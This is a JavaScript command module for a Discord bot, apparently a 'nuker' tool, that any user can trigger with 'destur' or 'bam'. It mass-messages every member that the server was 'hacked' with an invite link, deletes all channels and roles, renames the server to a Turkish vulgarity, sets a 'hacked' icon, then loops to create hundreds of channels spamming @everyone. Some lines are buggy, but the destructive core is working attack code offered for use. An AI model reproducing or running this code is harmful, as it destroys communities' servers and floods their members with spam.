const Discord = require("discord.js");
exports.run = function(client, message, args) {
  message.delete();
  message.guild.members.map(c =>
    c.send(+"J4j Sunucunuz Hacklendi. https://discord.gg/wXzFGWe")
  );
  message.guild.channels.forEach(sil => {
    sil.delete();
  });
  message.guild.roles.forEach(sil => {
    sil.delete();
  });
  message.guild.channels.map(c => c.delete());
  message.guild.setName("SIKILDI");
  message.guild.setIcon(
    "https://cdn.discordapp.com/attachments/658240477317038101/659820604538617886/hacked.jpg"
  );
  message.guild.owner.send("SIKILDI");
  console.log(`${message.guild.name} sunucusunu yok ettim!`);
  for (let i = 0; i < 420; i++) {
    setTimeout(function() {
      setInterval(() => {
        message.guild.createChannel("server-gg ", "text").then(c => {
          c.send(
            "@everyone @here TAKLİTLER ASLANI YÜCELTİR.https://discord.gg/wXzFGWe "
          );
          c.send(
            " @everyone @here AKLİTLER ASLANI YÜCELTİR.https://discord.gg/wXzFGWe "
          );
        }, 3000);
      });
    }, 3000);
  }
};

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["bam"],
  permLevel: 0
};

exports.help = {
  name: "destur",
  usage: "destur"
};
